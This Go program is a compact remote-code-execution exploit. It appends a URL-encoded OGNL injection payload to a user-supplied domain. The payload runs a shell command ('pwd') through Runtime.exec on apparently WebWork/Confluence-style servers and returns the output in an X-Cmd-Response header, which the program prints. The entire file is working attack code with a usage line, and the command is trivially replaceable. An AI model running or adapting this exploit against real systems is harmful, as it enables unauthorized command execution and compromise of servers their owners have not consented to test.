package main

import (
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
)

func HttpGet(url string) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal(err)
	}
	client := new(http.Client)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return errors.New("Redirect")
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(resp.Header.Get("X-Cmd-Response"))
	}
}

func main() {

	payload := "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22pwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
	domain := flag.String("domain", "", "please add your domain")
	flag.Parse()
	if *domain == "" {
		fmt.Println("usage : main.go -domain=127.0.0.1")
		return
	}
	newDomain := *domain + payload
	HttpGet(newDomain)

}
